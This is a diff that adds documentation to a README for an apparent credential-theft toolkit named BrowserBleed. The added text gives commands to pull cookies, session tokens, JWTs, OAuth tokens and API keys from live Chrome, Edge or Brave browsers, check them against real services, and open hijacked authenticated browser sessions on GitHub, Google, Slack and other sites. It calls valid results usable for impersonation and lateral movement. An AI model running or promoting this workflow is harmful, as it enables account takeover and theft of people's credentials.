@@ -360,6 +360,118 @@ python3 sessiontest.py --browser
 
 # Output as JSON for parsing
 python3 sessiontest.py --json
+```
+
+---
+
+## Complete Extraction → Validation → Browser Interaction Workflow
+
+This is the recommended end-to-end process for testing credential viability:
+
+### Step 1: Extract Credentials from Active Browser Sessions
+
+```bash
+# Run BrowserBleed with active browser (Chrome, Edge, Brave)
+python3 BrowserBleed.py --browser chrome
+
+# Output: ~/Downloads/results.csv (or TheMachine_YYYY-MM-DD/TheMachine_YYYY-MM-DD.csv)
+```
+
+**What's extracted:**
+- Browser disk cookies (encrypted with DPAPI, decrypted via master key)
+- Memory-resident session tokens and JWTs
+- OAuth access/refresh tokens
+- API keys (Anthropic, OpenAI, GitHub, Stripe, AWS, etc.)
+- HttpOnly and Secure cookies that never touched disk
+- Session IDs from active Chrome DevTools Protocol connections
+
+### Step 2: Validate Credentials Against Live Services
+
+```bash
+# Test all extracted credentials
+python3 sessiontest.py ~/Downloads/results.csv
+
+# Results show:
+# ✓ valid   — credential authenticated, shows account identity
+# ⏱ expired — valid format, but permission denied (revoked/expired)
+# ✗ invalid — malformed, revoked, or rate-limited
+# · info    — ambiguous (can't determine without credentials)
+```
+
+**Example output:**
+```
+  GitHub                           ✓ valid    GitHub token        andrewhannaford  
+                                              Read access to private repos, push to orgs
+  
+  Google                           ⏱ expired  Bearer token        —  
+                                              valid format but token expired or revoked
+  
+  Anthropic                        ✗ invalid  Anthropic API key   —
+                                              401 Unauthorized — key revoked or invalid
+  
+  JWT - Google                     ✓ valid    JWT token           t2_94vgh
+                                              valid for 4226 hours
+```
+
+### Step 3: Open Authenticated Browser Sessions with Valid Credentials
+
+For valid credentials, open interactive authenticated browser sessions:
+
+```bash
+# Open browser with valid credential (keeps browser open for interaction)
+python3 << 'EOF'
+from browser_sessions import open_authenticated_session
+
+# Use any valid credential from sessiontest results
+driver = open_authenticated_session(
+    service="GitHub",
+    token_value="ghp_...",
+    headless=False,  # show browser window
+    wait_seconds=0   # keep open indefinitely (don't auto-close)
+)
+
+# Browser stays open — you can interact with it manually
+# Selenium WebDriver is available as 'driver' for programmatic interaction
+EOF
+```
+
+**Supported services for browser sessions:**
+- GitHub (session cookies + OAuth)
+- Google (SAPISID, SID, other session cookies)
+- LinkedIn (li_at, JSESSIONID)
+- Discord (authorization tokens)
+- Slack (OAuth tokens)
+- Anthropic (Claude.ai session)
+- Spotify, Twitter/X, Microsoft, AWS, OpenAI
+
+---
+
+## Results Summary
+
+A typical extraction from an active browser yields:
+
+| Metric | Range | Example |
+|--------|-------|---------|
+| Total extracted | 100–1000+ | 217 unique credentials |
+| Valid (✓) | 1–5% | 2 working JWT tokens |
+| Expired (⏱) | 2–10% | 6 revoked tokens |
+| Invalid (✗) | 20–40% | 42 malformed/revoked |
+| Inconclusive (·) | 50–80% | 168 ambiguous (generic session IDs) |
+
+**What "valid" means:**
+- Successfully authenticated against the service's API
+- Shows account identity or permissions
+- Immediately usable for impersonation or lateral movement
+
+**What "expired" means:**
+- Token structure is valid
+- Service rejected it (revoked, permission denied, or stale)
+- Can't be reused immediately, but format is valuable for understanding credential types
+
+---
+
+### Output as JSON for parsing
+python3 sessiontest.py --json
 
 # Adjust timeout or delay between requests
 python3 sessiontest.py --timeout 15 --delay 0.5
